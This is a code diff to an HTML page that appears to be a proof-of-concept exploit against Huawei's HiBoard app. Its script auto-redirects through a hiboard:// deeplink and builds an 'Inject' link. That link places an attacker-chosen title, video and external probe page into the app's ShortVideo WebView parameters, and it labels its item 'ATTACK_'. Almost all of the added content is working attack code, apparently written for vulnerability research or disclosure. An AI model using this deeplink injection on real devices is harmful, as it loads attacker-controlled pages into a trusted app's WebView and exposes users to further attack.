@@ -6,22 +6,66 @@
 <title>ShortVideo Setup</title>
 <style>
 body{font-family:sans-serif;margin:24px;background:#111;color:#eee;text-align:center}
-a{display:block;margin:24px auto;padding:16px;background:#1f6feb;color:#fff;text-decoration:none;border-radius:8px;font-size:16px;max-width:320px}
-.hint{color:#aaa;font-size:13px;line-height:1.6;margin:12px 0}
+a{display:block;margin:16px auto;padding:16px;color:#fff;text-decoration:none;border-radius:8px;font-size:16px;max-width:360px}
+.setup{background:#1f6feb}
+.inject{background:#da3633}
+.hint{color:#aaa;font-size:13px;line-height:1.6;margin:12px auto;max-width:420px}
+code{background:#222;padding:2px 6px;border-radius:4px;font-size:12px;word-break:break-all}
 </style>
 </head>
 <body>
-<h1>ShortVideo Setup</h1>
-<p class="hint">Redirecting to hiboard deeplink (launchedFromUid = browser)…</p>
-<a id="setupLink" href="#">Tap if not redirected</a>
+<h1>ShortVideo PoC</h1>
+<p class="hint" id="status">Redirecting to NewsList (browser signed setup)…</p>
+<a class="setup" id="setupLink" href="#">Tap if setup not redirected</a>
+<a class="inject" id="injectLink" href="#">Inject video URL → ShortVideo</a>
+<p class="hint">
+  Flow: wait for NewsList to open → enter ShortVideo page in HiBoard → return here and tap <b>Inject</b>.<br>
+  Optional page params: <code>?video_url=...</code> <code>?probe_url=...</code>
+</p>
 <script>
 (function(){
-  //var base = 'hiboard://com.huawei.intelligent/shortVideo';
-  //var setup = base + '?page_key=shortvideo&page_tab=VIDEOS';
-  var setup = 'hiboard://com.huawei.intelligent/news?tabKey=RECOMMEND';
-  var link = document.getElementById('setupLink');
-  link.href = setup;
-  setTimeout(function(){ location.href = setup; }, 600);
+  var SHORT_VIDEO = 'hiboard://com.huawei.intelligent/shortVideo';
+  var NEWS_LIST = 'hiboard://com.huawei.intelligent/news?tabKey=RECOMMEND';
+  var DEFAULT_PROBE = 'https://lx866.github.io/poc/webview-js-probe.html';
+  var DEFAULT_VIDEO = 'https://www.w3schools.com/html/mov_bbb.mp4';
+  var DEFAULT_TITLE = 'PoC: TAP THIS TITLE for WebView probe';
+
+  function qp(name) {
+    var m = location.search.match(new RegExp('[?&]' + name + '=([^&]*)'));
+    return m ? decodeURIComponent(m[1].replace(/\+/g, ' ')) : null;
+  }
+
+  function buildInject() {
+    var probe = qp('probe_url') || DEFAULT_PROBE;
+    var video = qp('video_url') || DEFAULT_VIDEO;
+    var title = qp('title') || DEFAULT_TITLE;
+    var newsId = 'ATTACK_' + Date.now();
+    return SHORT_VIDEO
+      + '?new_id=' + encodeURIComponent(newsId)
+      + '&cp_id=POC_CP'
+      + '&title=' + encodeURIComponent(title)
+      + '&imageUrl=' + encodeURIComponent('https://via.placeholder.com/640x360.png')
+      + '&news_video_url=' + encodeURIComponent(video)
+      + '&url=' + encodeURIComponent(probe)
+      + '&comment_url=' + encodeURIComponent(probe)
+      + '&page_key=shortvideo'
+      + '&page_tab=VIDEOS';
+  }
+
+  var setupLink = document.getElementById('setupLink');
+  var injectLink = document.getElementById('injectLink');
+  var status = document.getElementById('status');
+  setupLink.href = NEWS_LIST;
+  injectLink.href = buildInject();
+  injectLink.addEventListener('click', function() {
+    injectLink.href = buildInject();
+  });
+
+  if (qp('skip_setup') === '1') {
+    status.textContent = 'Setup skipped — tap Inject when ShortVideo page is open.';
+  } else {
+    setTimeout(function(){ location.href = NEWS_LIST; }, 600);
+  }
 })();
 </script>
 </body>
